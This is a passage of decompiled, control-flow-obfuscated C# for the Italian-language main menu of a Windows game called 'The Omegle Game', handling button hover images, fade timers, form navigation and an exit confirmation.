				num = num11 ^ (int)(num2 * 1195512892);
				continue;
			}
			case 26u:
				num = (int)((num2 * 304039816) ^ 0x1A31D6B4);
				continue;
			case 25u:
				num = ((int)num2 * -550410525) ^ -1165996569;
				continue;
			case 24u:
			{
				int num7;
				int num8;
				if (flag3)
				{
					num7 = -423715265;
					num8 = -423715265;
				}
				else
				{
					num7 = -1471581956;
					num8 = -1471581956;
				}
				num = num7 ^ ((int)num2 * -1325388936);
				continue;
			}
			case 22u:
				GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
				num = ((int)num2 * -1189780241) ^ 0x6BB01A2E;
				continue;
			case 21u:
				num = (int)(num2 * 41614150) ^ -1283122717;
				continue;
			case 20u:
				int_0 = 0;
				float_0 = 0.3f;
				num = (int)((num2 * 1593329648) ^ 0x6C5A2B9D);
				continue;
			case 19u:
				num = (int)(num2 * 2088448875) ^ -2125622503;
				continue;
			case 18u:
				GForm1.smethod_16((Control)(object)PictureBox_1, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_1), float_0));
				num = ((int)num2 * -2074613583) ^ 0x57555EED;
				continue;
			case 17u:
				GForm1.smethod_31(Timer_0);
				num = (int)(num2 * 1035141063) ^ -1341852323;
				continue;
			case 16u:
				GForm1.smethod_19();
				num = ((int)num2 * -66790907) ^ -641270990;
				continue;
			case 15u:
				num = 2019314112;
				continue;
			case 14u:
			{
				ref float reference3 = ref float_0;
				reference3 = (float)((double)reference3 + 0.3);
				num = (int)((num2 * 2008383755) ^ 0x4D3C679D);
				continue;
			}
			case 13u:
				flag3 = int_1 == 5;
				num = (int)((num2 * 1274493225) ^ 0x743CF6DA);
				continue;
			case 12u:
			{
				int num5;
				int num6;
				if (int_1 == 0)
				{
					num5 = 1874278770;
					num6 = 1874278770;
				}
				else
				{
					num5 = 1515427530;
					num6 = 1515427530;
				}
				num = num5 ^ (int)(num2 * 687790237);
				continue;
			}
			case 11u:
			{
				ref float reference2 = ref float_0;
				reference2 = (float)((double)reference2 + 0.3);
				num = ((int)num2 * -297571898) ^ 0xD294B;
				continue;
			}
			case 10u:
			{
				ref float reference = ref float_0;
				reference = (float)((double)reference + 0.3);
				num = (int)(num2 * 2142660121) ^ -1730208414;
				continue;
			}
			case 9u:
				num = ((int)num2 * -932593173) ^ 0x4A690DE6;
				continue;
			case 8u:
				bool_0 = true;
				GForm1.smethod_16((Control)(object)this, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\main_menu.jpg")));
				num = ((int)num2 * -2014992024) ^ -1840795093;
				continue;
			case 7u:
				GForm1.smethod_16((Control)(object)PictureBox_3, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_3), float_0));
				num = ((int)num2 * -653552065) ^ 0x53788556;
				continue;
			case 6u:
				num = ((int)num2 * -1116530772) ^ 0x6CC9C147;
				continue;
			case 5u:
				GForm1.smethod_16((Control)(object)PictureBox_4, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_4), float_0));
				num = ((int)num2 * -246711827) ^ 0x6AEECF23;
				continue;
			case 4u:
				GForm1.smethod_20((object)int_0);
				num = ((int)num2 * -994884712) ^ 0x2F3D4D52;
				continue;
			case 3u:
				GForm1.smethod_32(Timer_0, 50);
				num = (int)((num2 * 1210282115) ^ 0x17857970);
				continue;
			case 2u:
			{
				float_0 = 0.3f;
				int num3;
				int num4;
				if (int_1 != 1)
				{
					num3 = -1219612469;
					num4 = -1219612469;
				}
				else
				{
					num3 = -260670010;
					num4 = -260670010;
				}
				num = num3 ^ (int)(num2 * 1742803568);
				continue;
			}
			case 1u:
				num = (int)((num2 * 1294681601) ^ 0xB677EE7);
				continue;
			case 0u:
				flag = int_1 == 2;
				num = 473134222;
				continue;
			case 50u:
				goto IL_0809;
			default:
				checked
				{
					int_0++;
					return;
				}
			}
			int num13;
			if (int_1 != 3)
			{
				num = 1708866;
				num13 = 1708866;
			}
			else
			{
				num = 764890628;
				num13 = 764890628;
			}
			continue;
			IL_0234:
			int num14;
			if (int_1 != 1)
			{
				num = 1489269276;
				num14 = 1489269276;
			}
			else
			{
				num = 47622730;
				num14 = 47622730;
			}
			continue;
			end_IL_0712:
			break;
		}
		goto IL_0356;
		IL_0356:
		num = 1602835316;
		goto IL_0712;
	}

	private void method_2(object sender, EventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = 2041191632;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7CE0E440u) % 5u)
				{
				case 4u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_hover.png")));
					num = ((int)num2 * -1869719670) ^ -1812950248;
					continue;
				case 3u:
					num = ((int)num2 * -1975476437) ^ 0x2F90534C;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1431515132;
						num4 = 1431515132;
					}
					else
					{
						num3 = 571302220;
						num4 = 571302220;
					}
					num = num3 ^ ((int)num2 * -1370191008);
					continue;
				}
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		if (bool_0)
		{
			goto IL_0047;
		}
		goto IL_0071;
		IL_0071:
		int num = 1924246982;
		goto IL_004c;
		IL_004c:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x2A4D7DCu) % 5u)
			{
			case 4u:
				GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
				num = ((int)num2 * -2050272433) ^ -1887644119;
				continue;
			case 2u:
				num = (int)(num2 * 908572173) ^ -125365125;
				continue;
			case 0u:
				break;
			default:
				return;
			case 3u:
				goto IL_0071;
			case 1u:
				return;
			}
			break;
		}
		goto IL_0047;
		IL_0047:
		num = 502189855;
		goto IL_004c;
	}

	private void method_4(object sender, MouseEventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = 272313671;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x76CE8A66u) % 8u)
				{
				case 7u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_pressed.png")));
					num = ((int)num2 * -1717155827) ^ -1246538875;
					continue;
				case 5u:
					num = (int)(num2 * 1230440321) ^ -68171035;
					continue;
				case 4u:
					bool_1 = true;
					GForm1.smethod_33((Control)(object)Class2.Class3_0.GForm3_0);
					num = ((int)num2 * -746654560) ^ -1958254892;
					continue;
				case 2u:
					GForm1.smethod_34((Form)(object)this);
					num = ((int)num2 * -967433440) ^ -2146868669;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -80729022;
						num4 = -80729022;
					}
					else
					{
						num3 = -1129115853;
						num4 = -1129115853;
					}
					num = num3 ^ (int)(num2 * 711074050);
					continue;
				}
				case 0u:
					GClass1.smethod_1().method_3();
					GClass1.smethod_1().method_4();
					num = ((int)num2 * -1453336821) ^ -652679430;
					continue;
				default:
					return;
				case 3u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		if (bool_0)
		{
			goto IL_0019;
		}
		goto IL_0071;
		IL_0071:
		int num = -879276408;
		goto IL_004c;
		IL_004c:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0xC12F165Du) % 5u)
			{
			case 4u:
				num = (int)((num2 * 1180584028) ^ 0x657C6143);
				continue;
			case 2u:
				break;
			case 1u:
				GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_hover.png")));
				num = (int)((num2 * 2061466723) ^ 0xFCD7205);
				continue;
			default:
				return;
			case 3u:
				goto IL_0071;
			case 0u:
				return;
			}
			break;
		}
		goto IL_0019;
		IL_0019:
		num = -1746391091;
		goto IL_004c;
	}

	private void method_6(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -827273350;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE3EEF8C7u) % 7u)
				{
				case 5u:
					flag = bool_0;
					num = ((int)num2 * -576652683) ^ 0x17AA2855;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 521159441;
						num4 = 521159441;
					}
					else
					{
						num3 = 973755682;
						num4 = 973755682;
					}
					num = num3 ^ (int)(num2 * 1617460076);
					continue;
				}
				case 3u:
					num = (int)(num2 * 2088165864) ^ -2113593626;
					continue;
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
					num = ((int)num2 * -1503810602) ^ 0x39E22E3;
					continue;
				case 1u:
					num = -1814158013;
					continue;
				default:
					return;
				case 0u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void method_7(object sender, MouseEventArgs e)
	{
		while (true)
		{
			int num = 185456799;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1B63C46Du) % 11u)
				{
				case 10u:
				{
					int num3;
					int num4;
					if (!bool_0)
					{
						num3 = 132331174;
						num4 = 132331174;
					}
					else
					{
						num3 = 1155397006;
						num4 = 1155397006;
					}
					num = num3 ^ (int)(num2 * 1002265639);
					continue;
				}
				case 9u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_pressed.png")));
					num = (int)(num2 * 451912317) ^ -1123854712;
					continue;
				case 8u:
					num = (int)((num2 * 390516601) ^ 0xFDED592);
					continue;
				case 7u:
					num = (int)(num2 * 2125628439) ^ -957290537;
					continue;
				case 6u:
					bool_1 = true;
					num = ((int)num2 * -1301644924) ^ -100062679;
					continue;
				case 5u:
					num = 660504151;
					continue;
				case 4u:
					GForm1.smethod_34((Form)(object)this);
					num = (int)(num2 * 1013024981) ^ -1331266153;
					continue;
				case 3u:
					num = ((int)num2 * -2079476554) ^ 0x434C21A6;
					continue;
				case 1u:
					GForm1.smethod_33((Control)(object)Class2.Class3_0.GForm2_0);
					num = (int)((num2 * 984252002) ^ 0x21E840EB);
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1763331467;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3E6ED05Du) % 7u)
				{
				case 6u:
					flag = bool_0;
					num = ((int)num2 * -1995498522) ^ -1275074920;
					continue;
				case 3u:
					num = (int)((num2 * 2008900064) ^ 0x32D862BA);
					continue;
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_hover.png")));
					num = (int)(num2 * 693906346) ^ -1338521353;
					continue;
				case 1u:
					num = 1383238752;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 1596556954;
						num4 = 1596556954;
					}
					else
					{
						num3 = 816896431;
						num4 = 816896431;
					}
					num = num3 ^ ((int)num2 * -1634053419);
					continue;
				}
				default:
					return;
				case 4u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = 1262486650;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x420E412Au) % 5u)
				{
				case 3u:
					num = ((int)num2 * -2022293668) ^ -506120439;
					continue;
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
					num = ((int)num2 * -393782318) ^ 0x7D878FA3;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -167386195;
						num4 = -167386195;
					}
					else
					{
						num3 = -1731908125;
						num4 = -1731908125;
					}
					num = num3 ^ ((int)num2 * -2108859087);
					continue;
				}
				default:
					return;
				case 4u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_10(object sender, MouseEventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = -934287822;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE1E3F1C0u) % 5u)
				{
				case 3u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 799309029;
						num4 = 799309029;
					}
					else
					{
						num3 = 943883879;
						num4 = 943883879;
					}
					num = num3 ^ (int)(num2 * 1027319776);
					continue;
				}
				case 2u:
					num = ((int)num2 * -1723053590) ^ -1861419065;
					continue;
				case 1u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_pressed.png")));
					num = ((int)num2 * -184323795) ^ -572636202;
					continue;
				default:
					return;
				case 0u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void method_11(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1486246001;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6611B3BEu) % 6u)
				{
				case 3u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_hover.png")));
					num = ((int)num2 * -346888954) ^ 0x76FF2C56;
					continue;
				case 2u:
					num = 270490259;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (bool_0)
					{
						num3 = -832035029;
						num4 = -832035029;
					}
					else
					{
						num3 = -1771901568;
						num4 = -1771901568;
					}
					num = num3 ^ (int)(num2 * 374970020);
					continue;
				}
				case 0u:
					num = ((int)num2 * -1419935195) ^ 0x7B20850A;
					continue;
				default:
					return;
				case 4u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void method_12(object sender, EventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = -363340505;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAE2982D9u) % 5u)
				{
				case 4u:
					num = ((int)num2 * -1748960011) ^ 0xDD93057;
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -468674322;
						num4 = -468674322;
					}
					else
					{
						num3 = -2074317321;
						num4 = -2074317321;
					}
					num = num3 ^ ((int)num2 * -796391282);
					continue;
				}
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
					num = ((int)num2 * -887661135) ^ 0x7ED2758E;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void method_13(object sender, MouseEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 983231328;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4569B9F9u) % 8u)
				{
				case 7u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -2050763053;
						num4 = -2050763053;
					}
					else
					{
						num3 = -1059984958;
						num4 = -1059984958;
					}
					num = num3 ^ (int)(num2 * 1299360680);
					continue;
				}
				case 4u:
					method_14();
					num = (int)(num2 * 1312438404) ^ -1446588095;
					continue;
				case 3u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_pressed.png")));
					num = (int)(num2 * 557524278) ^ -1563813425;
					continue;
				case 2u:
					num = 1430955916;
					continue;
				case 1u:
					flag = bool_0;
					num = ((int)num2 * -682224819) ^ -871534197;
					continue;
				case 0u:
					num = (int)((num2 * 1308375198) ^ 0x6ADD7CFB);
					continue;
				default:
					return;
				case 6u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	public void method_14()
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Invalid comparison between Unknown and I4
		if (!bool_1)
		{
			goto IL_0022;
		}
		goto IL_0287;
		IL_0287:
		GForm1.smethod_31(Timer_1);
		int num = -1059389811;
		goto IL_0215;
		IL_0215:
		bool flag = default(bool);
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0xA5315548u) % 24u)
			{
			case 22u:
				num = ((int)num2 * -217199482) ^ 0xB5DF01A;
				continue;
			case 21u:
				break;
			case 20u:
				GForm1.smethod_20((object)bool_1);
				num = ((int)num2 * -371373599) ^ -1903087412;
				continue;
			case 19u:
				num = ((int)num2 * -41595558) ^ -1981487359;
				continue;
			case 18u:
				flag = (int)GForm1.smethod_35("Sei sicuro di voler uscire dal gioco?", "The Omegle Game", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6;
				num = ((int)num2 * -1755945704) ^ 0x72461340;
				continue;
			case 17u:
				GForm1.smethod_19();
				num = (int)((num2 * 135819977) ^ 0x4A63C6E2);
				continue;
			case 16u:
				num = (int)((num2 * 1239392365) ^ 0x1B746A4C);
				continue;
			case 15u:
				GForm1.smethod_19();
				GForm1.smethod_36(GForm1.smethod_11());
				num = (int)(num2 * 1061265196) ^ -2023649522;
				continue;
			case 14u:
				GForm1.smethod_20((object)Timer_1);
				num = ((int)num2 * -1379687038) ^ -500346117;
				continue;
			case 13u:
				GForm1.smethod_20((object)bool_0);
				num = ((int)num2 * -1105705006) ^ 0x3F5545BE;
				continue;
			case 12u:
				num = (int)((num2 * 1666184012) ^ 0x5722783F);
				continue;
			case 11u:
				GForm1.smethod_20((object)bool_1);
				num = ((int)num2 * -1096584428) ^ -1007453699;
				continue;
			case 10u:
				num = ((int)num2 * -497874866) ^ 0x6E3E691F;
				continue;
			case 9u:
				num = ((int)num2 * -1384122891) ^ -1497768982;
				continue;
			case 8u:
			{
				int num3;
				int num4;
				if (!flag)
				{
					num3 = -1204312287;
					num4 = -1204312287;
				}
				else
				{
					num3 = -767632013;
					num4 = -767632013;
				}
				num = num3 ^ (int)(num2 * 212408818);
				continue;
			}
			case 7u:
				num = ((int)num2 * -573797164) ^ 0x2AB41A92;
				continue;
			case 6u:
				GForm1.smethod_20((object)bool_0);
				num = (int)((num2 * 1286825762) ^ 0x497477BE);
				continue;
			case 5u:
				GForm1.smethod_20((object)Timer_1);
				num = (int)(num2 * 565829638) ^ -328709837;
				continue;
			case 3u:
				GForm1.smethod_31(Timer_1);
				num = (int)(num2 * 1901502888) ^ -1478521554;
				continue;
			case 2u:
				num = ((int)num2 * -1625359733) ^ 0x504B8E17;
				continue;
			case 1u:
				num = -1164581432;
				continue;
			case 0u:
				num = ((int)num2 * -1361831420) ^ 0x4D9D8409;
				continue;
			default:
				return;
			case 4u:
				goto IL_0287;
			case 23u:
				return;
			}
			break;
		}
		goto IL_0022;
		IL_0022:
		num = -728112790;
		goto IL_0215;
	}

	private void method_15(object sender, FormClosingEventArgs e)
	{
		method_14();
		while (true)
		{
			int num = 848455950;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4A0554C8u) % 6u)
				{
				case 5u:
					num = (int)((num2 * 126304886) ^ 0x5BC86690);
					continue;
				case 3u:
				{
					int num3;
					int num4;
					if (bool_1)
					{
						num3 = -605582664;
						num4 = -605582664;
					}
					else
					{
						num3 = -209605385;
						num4 = -209605385;
					}
					num = num3 ^ ((int)num2 * -303062342);
					continue;
				}
				case 2u:
					num = (int)((num2 * 1281949764) ^ 0x5DFC00A9);
					continue;
				case 1u:
					GForm1.smethod_37((CancelEventArgs)(object)e, bool_3: true);
					num = ((int)num2 * -1906768613) ^ 0x40F0D3AC;
					continue;
				default:
					return;
				case 0u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void method_16(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -429568965;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD66FC80Cu) % 3u)
				{
				case 2u:
					goto IL_0003;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0003:
				GForm1.smethod_19();
				num = ((int)num2 * -1180646457) ^ 0x7C2A48D4;
			}
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			while (true)
			{
				int num = 782897230;
				while (true)
				{
					uint num2;
					int num3;
					switch ((num2 = (uint)num ^ 0x2CEAFD57u) % 8u)
					{
					case 7u:
						num = 889409106;
						continue;
					case 4u:
						num = (int)((num2 * 17002392) ^ 0x10D3E13F);
						continue;
					case 3u:
						GForm1.smethod_38((IDisposable)icontainer_0);
						num = ((int)num2 * -1631412678) ^ -486079187;
						continue;
					case 2u:
						if (icontainer_0 != null)
						{
							num = 1408347252;
							num3 = 1408347252;
							continue;
						}
						goto IL_004e;
					case 1u:
						if (disposing)
						{
							num = ((int)num2 * -2073931086) ^ 0x4BFD0C67;
							continue;
						}
						goto IL_004e;
					case 0u:
						num = ((int)num2 * -1837909738) ^ -942688832;
						continue;
					default:
						return;
					case 6u:
						break;
					case 5u:
						return;
						IL_004e:
						num = 975403120;
						num3 = 975403120;
						continue;
					}
					break;
				}
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_17()
	{
		//IL_04a8: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			int num = 1848597142;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x15BCC11Bu) % 77u)
				{
				case 76u:
					GForm1.smethod_47((Control)(object)PictureBox_0, "PictureBox1");
					num = (int)((num2 * 1024749196) ^ 0x701D4F4B);
					continue;
				case 75u:
					GForm1.smethod_50(PictureBox_2, bool_3: false);
					num = ((int)num2 * -997819061) ^ -1868514551;
					continue;
				case 74u:
					PictureBox_0 = GForm1.smethod_40();
					num = ((int)num2 * -36370485) ^ -1500493702;
					continue;
				case 73u:
					num = ((int)num2 * -1349216870) ^ -1264261019;
					continue;
				case 72u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_0);
					num = (int)((num2 * 71702159) ^ 0x3BAD193B);
					continue;
				case 71u:
					PictureBox_1 = GForm1.smethod_40();
					num = (int)((num2 * 344553776) ^ 0x1E2CF3D);
					continue;
				case 70u:
					GForm1.smethod_49(PictureBox_2, 2);
					num = (int)((num2 * 1543765897) ^ 0x354FFFD4);
					continue;
				case 69u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_2);
					num = (int)((num2 * 1725959390) ^ 0x258A2235);
					continue;
				case 68u:
					GForm1.smethod_48((Control)(object)PictureBox_3, new Size(329, 59));
					num = (int)(num2 * 1156023509) ^ -1366314423;
					continue;
				case 67u:
					GForm1.smethod_50(PictureBox_0, bool_3: false);
					GForm1.smethod_32(Timer_0, 300);
					num = (int)((num2 * 1087028531) ^ 0x51CAFD32);
					continue;
				case 66u:
					GForm1.smethod_44((Control)(object)PictureBox_2, Color.Transparent);
					num = ((int)num2 * -244683710) ^ 0x1DBD0EC3;
					continue;
				case 65u:
					GForm1.smethod_47((Control)(object)PictureBox_3, smethod_5(bool_3: true));
					num = ((int)num2 * -147875838) ^ -1048803641;
					continue;
				case 64u:
					num = ((int)num2 * -458052972) ^ 0x5B213C5D;
					continue;
				case 63u:
					num = (int)((num2 * 687919590) ^ 0x78841FED);
					continue;
				case 61u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_4);
					num = ((int)num2 * -2000567786) ^ 0x17E7D117;
					continue;
				case 60u:
					GForm1.smethod_66((Control)(object)this, bool_3: false);
					num = (int)(num2 * 389297225) ^ -1127405361;
					continue;
				case 59u:
					GForm1.smethod_48((Control)(object)PictureBox_0, new Size(617, 69));
					num = ((int)num2 * -182690019) ^ -643812044;
					continue;
				case 58u:
					icontainer_0 = GForm1.smethod_39();
					num = (int)((num2 * 2024580991) ^ 0x37A16C63);
					continue;
				case 57u:
					num = ((int)num2 * -1390903108) ^ -2091039242;
					continue;
				case 56u:
					num = (int)((num2 * 1827067176) ^ 0x7B6F476E);
					continue;
				case 55u:
					GForm1.smethod_58((Control)(object)this, GForm1.smethod_57("Consolas", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
					GForm1.smethod_59((Form)(object)this, (FormBorderStyle)1);
					num = (int)((num2 * 695734279) ^ 0x3DE35B7A);
					continue;
				case 54u:
					GForm1.smethod_46((Control)(object)PictureBox_4, new Point(396, 408));
					num = ((int)num2 * -1635165418) ^ 0x2F3C517B;
					continue;
				case 53u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_1);
					num = (int)((num2 * 1747787870) ^ 0x455D452C);
					continue;
				case 52u:
					GForm1.smethod_44((Control)(object)PictureBox_3, Color.Transparent);
					GForm1.smethod_46((Control)(object)PictureBox_3, new Point(337, 343));
					num = ((int)num2 * -2098494864) ^ -1030527888;
					continue;
				case 51u:
					GForm1.smethod_49(PictureBox_4, 4);
					num = ((int)num2 * -1940118396) ^ 0x7770B691;
					continue;
				case 50u:
					GForm1.smethod_49(PictureBox_3, 3);
					num = ((int)num2 * -549928176) ^ 0x5B46E88;
					continue;
				case 49u:
					PictureBox_3 = GForm1.smethod_40();
					num = (int)(num2 * 395768308) ^ -1022162072;
					continue;
				case 48u:
					GForm1.smethod_49(PictureBox_0, 0);
					num = (int)((num2 * 1988774744) ^ 0x7A8C8AB9);
					continue;
				case 47u:
					num = (int)(num2 * 1351264320) ^ -1583970738;
					continue;
				case 46u:
					GForm1.smethod_47((Control)(object)PictureBox_1, "PictureBox2");
					GForm1.smethod_48((Control)(object)PictureBox_1, new Size(303, 65));
					GForm1.smethod_49(PictureBox_1, 1);
					num = (int)(num2 * 2139595287) ^ -508710394;
					continue;
				case 45u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_2);
					GForm1.smethod_65((ISupportInitialize)PictureBox_3);
					num = (int)(num2 * 1348493538) ^ -155754060;
					continue;
				case 44u:
					num = ((int)num2 * -884098176) ^ 0x258B3081;
					continue;
				case 42u:
					GForm1.smethod_47((Control)(object)PictureBox_2, "PictureBox3");
					num = (int)((num2 * 870350836) ^ 0x63B864B6);
					continue;
				case 41u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_1);
					num = (int)(num2 * 1674546697) ^ -1760768392;
					continue;
				case 40u:
					GForm1.smethod_44((Control)(object)PictureBox_1, Color.Transparent);
					GForm1.smethod_46((Control)(object)PictureBox_1, new Point(349, 198));
					num = ((int)num2 * -1206292679) ^ 0x3A90B7CC;
					continue;
				case 39u:
					PictureBox_4 = GForm1.smethod_40();
					num = (int)((num2 * 1803410553) ^ 0x2EDD38DD);
					continue;
				case 38u:
					GForm1.smethod_60((Form)(object)this, new Padding(4));
					GForm1.smethod_61((Form)(object)this, bool_3: false);
					GForm1.smethod_62((Control)(object)this, "MainForm");
					num = (int)(num2 * 1479013719) ^ -1652981093;
					continue;
				case 37u:
					GForm1.smethod_48((Control)(object)PictureBox_4, new Size(213, 59));
					num = ((int)num2 * -1134962616) ^ 0x3219A388;
					continue;
				case 36u:
					num = ((int)num2 * -292502247) ^ 0x1A4C3DE0;
					continue;
				case 35u:
					num = ((int)num2 * -480313535) ^ 0x734AD8F1;
					continue;
				case 34u:
					GForm1.smethod_52((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -2041317869) ^ 0x5F759F26;
					continue;
				case 33u:
					GForm1.smethod_48((Control)(object)PictureBox_2, new Size(329, 59));
					num = ((int)num2 * -1382009222) ^ -410803241;
					continue;
				case 32u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_4);
					num = (int)((num2 * 544396561) ^ 0x154A562);
					continue;
				case 31u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_3);
					num = ((int)num2 * -1720018695) ^ -887989683;
					continue;
				case 30u:
					num = ((int)num2 * -1662957972) ^ 0x6DF9DB7;
					continue;
				case 29u:
					GForm1.smethod_46((Control)(object)PictureBox_0, new Point(214, 12));
					num = ((int)num2 * -474994652) ^ 0x617F7298;
					continue;
				case 28u:
					num = (int)(num2 * 533736026) ^ -848278048;
					continue;
				case 27u:
					GForm1.smethod_47((Control)(object)PictureBox_4, "PictureBox5");
					num = ((int)num2 * -976014438) ^ -1332027797;
					continue;
				case 26u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_0);
					num = ((int)num2 * -1878436217) ^ 0x79CA47DC;
					continue;
				case 25u:
					num = ((int)num2 * -966855301) ^ -1693726044;
					continue;
				case 24u:
					num = (int)((num2 * 1321621813) ^ 0x28744166);
					continue;
				case 23u:
					GForm1.smethod_44((Control)(object)PictureBox_4, Color.Transparent);
					num = (int)(num2 * 786115163) ^ -457080051;
					continue;
				case 22u:
					num = (int)((num2 * 2094610015) ^ 0x2DE01975);
					continue;
				case 21u:
					GForm1.smethod_43((Control)(object)this);
					GForm1.smethod_44((Control)(object)PictureBox_0, Color.Transparent);
					GForm1.smethod_45((Control)(object)PictureBox_0, (ImageLayout)3);
					num = ((int)num2 * -1648186048) ^ 0x28A112E1;
					continue;
				case 20u:
					GForm1.smethod_50(PictureBox_1, bool_3: false);
					num = (int)(num2 * 927994059) ^ -1344081785;
					continue;
				case 19u:
					num = (int)(num2 * 1443793736) ^ -851231395;
					continue;
				case 18u:
					num = ((int)num2 * -1400957316) ^ -2014337877;
					continue;
				case 17u:
					PictureBox_2 = GForm1.smethod_40();
					num = ((int)num2 * -1975564939) ^ -1575737822;
					continue;
				case 16u:
